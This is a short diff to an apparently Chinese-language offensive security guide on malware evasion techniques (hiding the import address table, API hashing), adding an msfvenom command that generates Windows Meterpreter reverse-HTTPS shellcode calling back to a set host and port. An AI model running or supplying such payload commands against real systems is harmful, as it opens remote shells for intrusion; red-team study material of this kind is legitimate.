@@ -972,6 +972,12 @@ if (RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersi
 
 6. 隐藏导入地址表
 
+shellcode:
+
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.189 LPORT=4444 -f c
+```
+
 [隐藏导入地址表](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8F%8D%E9%9D%99%E6%80%81/隐藏导入地址表.cpp)
 
 7. API哈希
